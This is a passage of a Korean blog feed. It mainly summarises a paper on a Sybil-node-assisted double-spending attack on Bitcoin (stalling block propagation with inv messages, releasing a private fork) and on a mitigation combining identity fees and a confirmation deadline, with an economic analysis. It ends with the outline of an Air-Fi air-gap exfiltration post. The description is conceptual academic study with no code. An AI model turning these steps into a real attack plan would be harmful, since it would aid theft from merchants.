&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;이중 거래 공격이란, 악의적 목적으로 동시에 두 곳 이상의 계좌로 송금하는 행위를 의미한다. 이를 방지하기 위해 크게 두 가지 메커니즘을 사용한다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;총 통화량
    &lt;ul&gt;
      &lt;li&gt;전체 코인의 수를 정해 놓고, 이중 거래 발생 시 총 코인 수가 초과됨을 감지해 차단한다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;The Longest Chain Wins
    &lt;ul&gt;
      &lt;li&gt;블록체인이 모종의 이유로 인해 분기(Fork)될 경우, 길이가 더 긴 체인(=블록 생성 속도가 더 빠른 체인)을 적법한 체인으로 간주해 main branch에 merge한다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;합의-기법&quot;&gt;합의 기법&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;합의란,&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;주어진 새 블록을 체인에 연결할 때 블록에 삽입할 ‘조건을 만족하는’ 넌스값을 찾고&lt;/li&gt;
  &lt;li&gt;주어진 트랜젝션(블록)이 변조된 것이 아닌지를 모든 노드가 참여하여 판단하는 과정을 의미한다.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;이 때, 1. 조건을 만족하는 넌스를 찾는 행위를 채굴이라 한다. 채굴을 가장 먼저 성공한 노드는 블록 체인의 생성에 기여한 것으로 판단, 보상을 받는다.&lt;/p&gt;

&lt;p&gt;합의 기법에는 크게 두 가지가 있다. (가장 기본적인 것만 나열할 거라 두 가지다. 기존의 두 가지를 발전시켜 현재는 다양한 기법들이 있다)&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;PoW(Proof of Work, 작업 증명)&lt;/p&gt;

    &lt;p&gt;: 대부분의 블록체인 기반 가상자산들이 사용하는 방법으로, 채굴 속도에 영향을 주는 변인이 ‘컴퓨팅 파워’이다. 이 점은 에너지 낭비와 느린 속도라는 단점을 가져온다.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;PoS(Proof of Stake, 지분 증명)&lt;/p&gt;

    &lt;p&gt;: 채굴 속도에 영향을 주는 변인이 ‘자신이 소유한 가상 통화의 양’이다. 즉, 자신의 지분(stake)에 따라 블록을 생성하고 추가적으로 발행되는 코인을 받는다. 그러나 이는 부익부 빈익빈, 그리고 PoW에 비해 돈만 들이면 장악하기 쉬운 구조라는 단점을 가져온다.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;블록체인의-구조&quot;&gt;블록체인의 구조&lt;/h2&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;사실 그리려고 했는데, 내가 지금 시간이 없다… 나중에 천천히 그려서 올리는 걸로 하고(아마 날 잡고 하겠지)&lt;/p&gt;

&lt;p&gt;일단은 책에 나온 사진만 올려놓겠다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/230602/Untitled.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;공격-기법-설명대략적&quot;&gt;공격 기법 설명(대략적)&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;서론이 길었다! 드디어 논문 내용에 대해 이야기해볼 차례다. 이 논문은 새로운 형태의 블록체인에 대한 복합 공격을 이야기하고, 그에 대한 방어책을 설명한 다음, 그 방어책의 효과를 검증하는 식으로 내용을 구성했다. 따라서 가장 먼저 이 논문이 어떤 공격을 다루고 있는지에 대해 서술하겠다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;double-spending-with-a-sybil-attack&quot;&gt;Double-Spending With a Sybil Attack&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;개요&quot;&gt;개요&lt;/h3&gt;

&lt;p&gt;일반적인 &lt;a href=&quot;https://m.upbitcare.com/academy/education/blockchain/403&quot;&gt;Sybil Attack&lt;/a&gt;은 Sybil Node&lt;sup id=&quot;fnref:sybil_node&quot;&gt;&lt;a href=&quot;#fn:sybil_node&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot; role=&quot;doc-noteref&quot;&gt;4&lt;/a&gt;&lt;/sup&gt;를 조작된 정보를 브로드캐스트하기 위해 사용한다. 그렇기 때문에 탐지가 가능하다.&lt;/p&gt;

&lt;p&gt;이 논문에서는 조금 다른 Sybil Attack을 제시한다. 이 복합 공격에서는 Sybil Node들을 블록 정보 전파를 방해하는 데만 사용하고, 조작된 정보를 브로드캐스트하는 데에는 사용하지 않는다.&lt;/p&gt;

&lt;p&gt;일단 이 논문은 방어책에 중점을 둔 논문인지라, 해당 공격에 관한 자세한 내용은 이 논문의 &lt;a href=&quot;https://ieeexplore.ieee.org/document/8733108&quot;&gt;시리즈 논문&lt;/a&gt;에서 찾아볼 수 있다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;공격-시나리오&quot;&gt;공격 시나리오&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;공격자는 아주 많은 수의 가짜 노드들(Sybil nodes)를 비트코인 네트워크 상에 등록한다.
    &lt;ul&gt;
      &lt;li&gt;이 때, 하나의 Sybil node는 여러 개의 가짜 ID를 가진다.&lt;/li&gt;
      &lt;li&gt;하나의 정상 노드는 하나의 ID만을 가지는 것과 대조된다.&lt;/li&gt;
      &lt;li&gt;한 Sybil node가 가지는 여러 fake ID들로 인해 정상 노드들은 자기가 각자 다른 노드들과 통신한다고 착각한다.&lt;/li&gt;
      &lt;li&gt;이때, Sybil nodes는 블록 마이닝에 전혀 참여하지 않고, 블록 정보 전파에만 참여한다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;공격자는 어떤 상품을 사기 위해 트랜잭션 TX1을 생성해 판매자에게 전송한다.&lt;/li&gt;
  &lt;li&gt;TX1은 브로드캐스트되어 유효성 검증을 통과한다.&lt;/li&gt;
  &lt;li&gt;그럼 이제 TX1을 체인에 추가하기 위한 합의 과정이 필요하다. 그런데 이 합의가 이루어져 TX1이 높이 H 위치의 블록 안에 들어가기 전에, 공격자는 TX2를 생성해 사전에 계획을 짠 다른 공격자의 지갑으로 전송한다.&lt;/li&gt;
  &lt;li&gt;이 TX2는 TX1의 트랜잭션 결과 정보를 똑같이 가지고 있다.
    &lt;ul&gt;
      &lt;li&gt;이는 분명히 비트코인 트랜잭션의 정책에 위배된다. UTXO 정책은 하나의 트랜잭션 결과는 단 한 번만 사용될 수 있도록 했기 때문이다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;UTXO를 위배했다는 사실이 걸리지 않도록 공격자는 TX2가 들어 있는 블록을 퍼블릭 체인에 publish하지 않고, TX2가 들어 있는 블록에 자신이 채굴한 블록들을 이어 붙임으로써 블록체인의 높이 H위치에서 fork된 프라이빗 체인을 만들어 둔다.&lt;/li&gt;
  &lt;li&gt;이제 앞에서 설명했던 ‘The Longest Chain Wins’ 규칙을 생각해 보자. 이 규칙을 악용하기 위해 공격자는 Sybil node를 이용한다.&lt;/li&gt;
  &lt;li&gt;만일 Sybil node가 아닌 정상 노드가 새로운 블록을 채굴하는 데 성공했다면, Sybil node는 자신이 가진 여러 개의 가짜 ID를 이용해서 아직 새로운 블록 채굴 소식을 전달받지 못한 정상 노드들에게 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;inv&lt;/code&gt; 메시지&lt;sup id=&quot;fnref:inv&quot;&gt;&lt;a href=&quot;#fn:inv&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot; role=&quot;doc-noteref&quot;&gt;5&lt;/a&gt;&lt;/sup&gt;를 마구 보낸다.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;inv&lt;/code&gt; 메시지를 받은 정상 노드들은 당연히 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getdata&lt;/code&gt; 메시지를 보낸다.&lt;/li&gt;
  &lt;li&gt;하지만 Sybil node는 절대 블록 정보를 회신해 주지 않는다.&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;회신받지 못한 정상 노드들은 계속해서 블록 정보를 요청하며 기다리는 상태가 된다.&lt;/p&gt;

    &lt;p&gt;→ 이 일련의 과정은 DDoS 방법 중 TCP SYN Flood Attack과 닮았다.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;정상 노드들은 이게 반복되면 자신의 이웃 노드 목록에서 답신이 없었던 ID를 빼버리고 다른 ID를 넣을 수 있다. 하지만 Sybil node는 여러 개의 가짜 ID를 가지고 있기 때문에, 그렇게 다른 ID를 가진 블록과 통신하려는 시도는 무용지물이다. 따라서 매우 높은 확률로 정상 노드들은 계속해서 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getdata&lt;/code&gt; 를 보내며 회신을 기다리는 상태에 빠진다.&lt;/li&gt;
  &lt;li&gt;이렇게 블록 데이터를 기다리는 데 할당된 시간이 모두 지나면, 노드들은 데이터를 받길 포기하고 다음 채굴 라운드를 시작한다.&lt;/li&gt;
  &lt;li&gt;&lt;mark&gt;8~13 과정으로 인해 합의 과정이 계속해서 지연되고, 노드들 간에 가지고 있는 블록체인이 달라져 자연스럽게 블록 체인의 fork가 발생한다.&lt;/mark&gt;
    &lt;ul&gt;
      &lt;li&gt;이 시점에서 블록 체인에 발생한 fork에는 총 세 개 종류가 있다.
        &lt;ol&gt;
          &lt;li&gt;공격자가 몰래 만들고 있는 프라이빗 체인 (6번 참고)&lt;/li&gt;
          &lt;li&gt;8~13 과정 때문에 새 블록 생성의 시간이 계속 늦어지고 있는 메인 체인&lt;/li&gt;
          &lt;li&gt;네트워크 분할 현생 때문에 생겨나는-그러나 메인 체인의 연산 자원을 낭비해 더 느려지게 만드는-자연스러운 체인들&lt;/li&gt;
        &lt;/ol&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;이런 지연이 누적되어 공격자가 가진 프라이빗 체인이 현존하는 forked chains중 가장 길어질 때, 그리고 판매자로부터 구매했던 상품을 공격자가 수신했을 때, 공격자는 자신의 프라이빗 체인을 release한다.&lt;/li&gt;
  &lt;li&gt;다시 한 번 짚어보자. 메인 체인의 높이 H 블록에는 TX1이 들어가 있다. 공격자가 가진 프라이빗 체인의 높이 H블록에는 TX2가 들어가 있다. 이 상황에서 공격자의 체인 길이가 메인 체인보다 길다. 그리고 ‘The Longest Chain Rule’이 존재한다. 즉, 공격자의 프라이빗 체인이 높이 H부터 메인 체인을 덮어쓴다.&lt;/li&gt;
  &lt;li&gt;어라? 판매자에게 송금했던 트랜잭션 TX1은 이제 존재하지 않는다. 대신 공격자가 다른 공격자와 짜고 만들었던 TX2만 존재한다. 즉, 공격자는 15에서 상품을 수신해 놓고 아무 돈도 지불하지 않는 이득을 보았다.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;how-to-mitigate-2-ways-will-be-combined&quot;&gt;How to Mitigate: 2 ways will be combined&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;방어책은 크게 두 가지 갈래로 나뉜다.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;공격자의 Attack Cost를 높이는 방식: Creating an Identity Fee&lt;/li&gt;
  &lt;li&gt;네트워크 Delay 탐지 기법을 적용한 방식: Setting a Deadline&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;그리고 이 논문에서는 이 둘을 합친 복합 방어책을 제시하고, 그것이 매우 효과적임을 입증한다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;charging-an-identity-fee&quot;&gt;Charging an Identity Fee&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;앞서 설명한 공격의 전제는 공격자가 무수한 ID를 만들고 유지할 수 있다는 것이었다. 이 전제가 성립될 수 없게 하는 방어 기법이다.&lt;/p&gt;

&lt;p&gt;노드가 최초로 체인에 참여할 때 Entry fee를 징수하고, 추가로 노드가 합의 과정에 참여할 때마다 Participation fee를 징수한다. 이 때, Participation fee는 각 채굴 라운드의 시작 전에 징수된다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;setting-a-deadline&quot;&gt;Setting a Deadline&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;앞서 설명한 공격의 핵심은 공격자가 합의(consensus)에 걸리는 시간을 마음먹은 만큼 지연시키는 게 가능하다는 점이었다. 그러나 그것이 불가능하다면?&lt;/p&gt;

&lt;p&gt;평균적으로 하나의 트랜잭션이 블록에 삽입되기 위해서는 6개의 블록이 컨펌되기를 기다려야 한다. 대기열에 내 앞으로 통상 6개의 블록이 들어있다는 것이다.&lt;/p&gt;

&lt;p&gt;그렇다면 이렇게 봐도 되지 않을까? 판매자가 수신했던 TX1을 블록에 삽입하려고 기다리는데, 일반적으로 6개 블록이 컨펌되는 시간 내에 앞선 6개 블록이 컨펌되지 않아 더 오래 기다려야 한다면, 지금 공격을 받고 있는 상황이라고?&lt;/p&gt;

&lt;p&gt;그렇다면 ‘일반적으로 6개 블록이 컨펌되는 시간’의 개념을 포함할 수 있는 시간을 정하고, 그것을 데드라인 D라고 하자. 판매자는 TX1을 수신한 시간으로부터 D가 지났는데도 6개 블록의 컨펌이 이루어지지 않았다면 구매자에게 상품을 넘겨주길 거부할 수 있게 된다.&lt;/p&gt;

&lt;p&gt;이렇게 되면 공격자는 자신이 딜레이시킬 수 있는 시간이 최대 D인 데다가, 그것을 초과하는 순간 이제까지 채굴해 놨던 블록들과 짜고 쳤던 트랜잭션 TX2가 포함된 블록이 있는 프라이빗 체인을 유지할 이유가 전혀 없어진다. 그렇다고 D 안에 목표를 이루기엔 전제부터가 안된다. 정상 시간이 D이기 때문에 무조건 D를 넘겨야 뭐라도 해볼 수 있기 때문이다. 정상 시간 D 안에 뭘 하려면 컴퓨팅 파워를 더 올려야 한다.&lt;/p&gt;

&lt;p&gt;즉 손해만 남는 장사인 것이다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;잡설: 육참골단! 예전에 읽었던 사기열전에서 손빈이 ‘급소를 치고 빈틈을 공격하여 형세를 불리하게 만들면 모든 것은 저절로 풀릴 것입니다’라고 했던 말이 생각난다. 이렇게 영리하게 급소를 분석해서 그걸 공략해야 효과적인 방안을 만들 수 있구나… 근데 이거 당연한 거 아닌가 아 근데 당연한 것일수록 생각해내기 어렵다.&lt;/p&gt;

&lt;p&gt;아무튼 나중에 연구할 때 꼭 마인드에 가지고 있어야지.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;economic-analysis&quot;&gt;Economic Analysis&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;어차피 수식이고 다들 알 것 같으니… 수식과 각 변수가 의미하는 바만 서술한다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;원래-상태에서-공격자의-공격-비용&quot;&gt;원래 상태에서 공격자의 공격 비용&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

\[C_{original} = (1-Φ)(v+12.5k_z)\]

&lt;p&gt;\(C_{original}\)은 공격자가 앞서 설명한 방어 기법이 적용되지 않은 상황에서 지출해야 하는 공격 비용이다.&lt;/p&gt;

&lt;p&gt;공격자가 \(Φ\)의 확률로 공격을 성공할 때, 공격 실패 확률은 확률의 정의에 의거해 \((1-Φ)\)이다.&lt;/p&gt;

&lt;p&gt;공격자가 구매한 상품의 가격이 v이고, 현재 평균적으로 채굴 성공에 따라오는 보상은 12.5 BTC 이며, 공격자가 프라이빗 체인을 더 길게 구성하기 위해 따로 채굴한 블록의 수가 \(k_z\)일 때, 공격자가 실패할 경우 지불해야만 하는 비용은 \(v+12.5k_z\)이다.&lt;/p&gt;

&lt;p&gt;따라서 실비용은 발생확률*지출비용이라는 공식에 따라 위와 같은 식이 도출된다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;combined-mitigation-하에서-공격자의-공격-비용&quot;&gt;Combined mitigation 하에서 공격자의 공격 비용&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

\[C_{combined} =
\begin{cases}
(1-Φ)(v+12.5k_z) + (ε+zσ)γμN, S_z≤D \\
(v+12.5k_D) + (ε+zσ)γμN, S_z&amp;gt;D
\end{cases}\]

&lt;p&gt;\(k_D\)는 D 시간 내에 공격자가 채굴한 블록의 수다. D는 앞서 말한 데드라인 시간이다.&lt;/p&gt;

&lt;p&gt;\(ε\)는 Entry Fee이다.&lt;/p&gt;

&lt;p&gt;\(σ\)는 Participation Fee이다.&lt;/p&gt;

&lt;p&gt;\(z\)는 participation fee를 요구하는 채굴 라운드의 수다.&lt;/p&gt;

&lt;p&gt;\(γ\)는 하나의 Sybil Node가 가진 ID의 수다.&lt;/p&gt;

&lt;p&gt;\(μ\)는 현재 블록 체인에 관여하는 전체 노드의 수에서 Sybil node가 차지하는 비율이다.&lt;/p&gt;

&lt;p&gt;\(N\)은 현재 블록 체인에 관여하는 전체 노드의 수다.&lt;/p&gt;

&lt;p&gt;\(S_z\)는 \(z\)개 블록이 컨펌되기까지 걸리는 시간이다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;공격자의-손익분기점-구하기&quot;&gt;공격자의 손익분기점 구하기&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;먼저 공격자가 어떤 경우에서 얼마만큼의 기본 이득을 보장받는지 보자. (+\로 붙어 있는, 즉 상수로 존재하는 지출 비용은 고려하지 않는다. 진짜로 얼마만큼의 이익이 들어오는지를 보는 것이다. 순이익이 아니다!!!)&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;case-1-데드라인보다-z개-블록-컨펌-시간이-짧아-이상거래를-숨길-수-있을-때&quot;&gt;Case 1: 데드라인보다 z개 블록 컨펌 시간이 짧아 이상거래를 숨길 수 있을 때&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;공격자가 D시간 내에 블록을 하나도 채굴하지 못했더라도 최초 거래 TX1으로 얻은 상품 가격 \(v\)만큼의 이득만은 반드시 보장된다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;case2-데드라인보다-z개-블록-컨펌-시간이-길어-이상거래를-숨길-수-없을-때&quot;&gt;Case2: 데드라인보다 z개 블록 컨펌 시간이 길어 이상거래를 숨길 수 없을 때&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;공격자는 아무 이득도 얻지 못한다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;case1--case2-공격자-이득의-기댓값과-손익분기점&quot;&gt;Case1 + Case2: 공격자 이득의 기댓값과 손익분기점&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;\(Φ_2\)를 \(S_z ≤ D\) 일 때의 확률이라고 하자. 그렇다면 모든 경우를 고려할 때 공격자가 가질 수 있는 이득의 기댓값은  \(Φ_2v\)가 된다.&lt;/p&gt;

&lt;p&gt;손익분기점은 공격 비용이 공격자의 이득 기댓값과 일치하는 지점이다. 따라서 아래와 같은 수식을 세울 수 있다.&lt;/p&gt;

\[Φ_2v = C_{combined}\]

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;다양한-조건-하에서-공격자의-손익분기점&quot;&gt;다양한 조건 하에서 공격자의 손익분기점&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;여기 내용은 대부분의 내용을 생략한다. 결론은 당연히 Combined mitigation이 Sybil node가 늘어남에 따라 공격자의 손익분기점을 기하급수적으로 높인다-즉 공격자가 공격에 더 큰 비용을 써야 한다는 것을 시사한다. 이는 아무 mitigation도 적용되지 않았을 때와 정반대의 손익분기점 경향성을 보인다.&lt;/p&gt;

&lt;p&gt;다양한 조건 하에서 공격자의 손익분기점을 구하기 위해 논문의 글쓴이는 앞서 말한 수식의 파라미터 값을 현실성 있는 값으로 바꿔가며 계산했고, \(Φ_2v\)를 구하기 위해 확률 모델을 사용해 추가적인 계산을 진행했다.&lt;/p&gt;

&lt;h2&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/h2&gt;
&lt;div class=&quot;footnotes&quot; role=&quot;doc-endnotes&quot;&gt;
  &lt;ol&gt;
    &lt;li id=&quot;fn:transparency&quot;&gt;
      &lt;p&gt;이는 Manifest 할 때의 그 투명성이다. 즉 정보시스템 차원에서 이야기하는 그 투명성-기능과 기능 사이에 무엇이 개입하는지 엔드포인트 엔티티들은 알 필요 없음-이 아니다. &lt;a href=&quot;#fnref:transparency&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
    &lt;li id=&quot;fn:mining&quot;&gt;
      &lt;p&gt;이를 블록 체인에서는 ‘채굴’이라 칭한다. &lt;a href=&quot;#fnref:mining&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
    &lt;li id=&quot;fn:digital_sign&quot;&gt;
      &lt;p&gt;신원증명과 거래 안전성을 위한 기술은 단방향해시함수 → MAC → 전자서명 → PKI의 흐름으로 발전했음을 강조하고 싶다. 즉, 이후에 개발된 기술은 이전 기술의 기능을 모두 보장 및 보완했다. 따라서 전자서명은 MAC의 특성(무결성-이는 해시함수의 특징이다-및 상호 인증)을 계승하며 추가적으로 1) 제3자에게의 거래내역 인증 2) 부인방지기능 까지를 보장한다. &lt;a href=&quot;#fnref:digital_sign&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
    &lt;li id=&quot;fn:sybil_node&quot;&gt;
      &lt;p&gt;하나의 노드가 여러 개의 가짜 ID를 가지는 노드를 말한다. 중앙 집중형 네트워크보다는 P2P 네트워크를 침해하는 데 훨씬 효과적이다. &lt;a href=&quot;#fnref:sybil_node&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
    &lt;li id=&quot;fn:inv&quot;&gt;
      &lt;p&gt;investigated 의 준말로, 채굴에 성공한 노드가 자신의 이웃 목록에 있는 노드들에게 브로드캐스팅하는 메시지이다. 이를 받은 노드는 블록의 검증을 수행할 수 있다. 블록 검증이란 이게 정상적으로 생성된 블록인지, 내가 가진 블록인지를 판단하는 과정인데, 여기에서 자신이 가지지 않은 블록이라는 결론이 나오면 getdata 메시지를 inv sender에게 보내 블록 정보를 전달받는다. &lt;a href=&quot;#fnref:inv&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
  &lt;/ol&gt;
&lt;/div&gt;
</description>
        <pubDate>Fri, 02 Jun 2023 01:20:23 -0500</pubDate>
        <link>https://touBVa.github.io/blog/paper_study/sybil-based</link>
        <guid isPermaLink="true">https://touBVa.github.io/blog/paper_study/sybil-based</guid>
      </item>
    
      <item>
        <title>[논문 스터디] Air-Fi: Leaking Data From Air-Gapped Computers Using Wi-Fi Frequencies</title>
        <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#마인드맵-정리본&quot; id=&quot;markdown-toc-마인드맵-정리본&quot;&gt;마인드맵 정리본&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#들어가기에-앞서&quot; id=&quot;markdown-toc-들어가기에-앞서&quot;&gt;들어가기에 앞서&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#sec3-공격-모델-이원적&quot; id=&quot;markdown-toc-sec3-공격-모델-이원적&quot;&gt;Sec3) 공격 모델: 이원적&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#개요&quot; id=&quot;markdown-toc-개요&quot;&gt;개요&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#transmitter&quot; id=&quot;markdown-toc-transmitter&quot;&gt;Transmitter&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#receiver&quot; id=&quot;markdown-toc-receiver&quot;&gt;Receiver&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#sec4-ddr-sdram-wi-fi-배경지식-다들-알-것-같아서-생략&quot; id=&quot;markdown-toc-sec4-ddr-sdram-wi-fi-배경지식-다들-알-것-같아서-생략&quot;&gt;Sec4) DDR SDRAM, Wi-Fi 배경지식 (다들 알 것 같아서 생략)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#sec5-sendertransmissin-입장의-기작&quot; id=&quot;markdown-toc-sec5-sendertransmissin-입장의-기작&quot;&gt;Sec5) Sender(transmissin) 입장의 기작&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#51-signal-generation&quot; id=&quot;markdown-toc-51-signal-generation&quot;&gt;5.1. Signal Generation&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#511-전자기-신호-방출&quot; id=&quot;markdown-toc-511-전자기-신호-방출&quot;&gt;5.1.1. 전자기 신호 방출&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#512-wi-fi-신호를-어떻게-생성할-것인가&quot; id=&quot;markdown-toc-512-wi-fi-신호를-어떻게-생성할-것인가&quot;&gt;5.1.2. Wi-Fi 신호를 어떻게 생성할 것인가?&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#513-wi-fi-채널-간섭-현상은-어떻게-해결할-것인가&quot; id=&quot;markdown-toc-513-wi-fi-채널-간섭-현상은-어떻게-해결할-것인가&quot;&gt;5.1.3. Wi-Fi 채널 간섭 현상은 어떻게 해결할 것인가?&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#52-signal-modulation&quot; id=&quot;markdown-toc-52-signal-modulation&quot;&gt;5.2. &lt;strong&gt;Signal Modulation&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#53-data-transmission&quot; id=&quot;markdown-toc-53-data-transmission&quot;&gt;5.3. &lt;strong&gt;Data Transmission&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#sec6-receiver-입장의-기작&quot; id=&quot;markdown-toc-sec6-receiver-입장의-기작&quot;&gt;Sec6) Receiver 입장의 기작&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#61-개요&quot; id=&quot;markdown-toc-61-개요&quot;&gt;6.1. 개요&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#62-physical-layer에-접근-가능한-wifi-스택의-레이어&quot; id=&quot;markdown-toc-62-physical-layer에-접근-가능한-wifi-스택의-레이어&quot;&gt;6.2. Physical Layer에 접근 가능한 Wifi 스택의 레이어&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#621-application-layer-user-level&quot; id=&quot;markdown-toc-621-application-layer-user-level&quot;&gt;6.2.1. Application Layer (user-level)&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#622-device-drivers-layer-kernel-layer&quot; id=&quot;markdown-toc-622-device-drivers-layer-kernel-layer&quot;&gt;6.2.2. Device-Drivers Layer (kernel-layer)&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#623-firmware-level&quot; id=&quot;markdown-toc-623-firmware-level&quot;&gt;6.2.3. Firmware-Level&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#624-attack-surface-설정&quot; id=&quot;markdown-toc-624-attack-surface-설정&quot;&gt;6.2.4. Attack Surface 설정&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
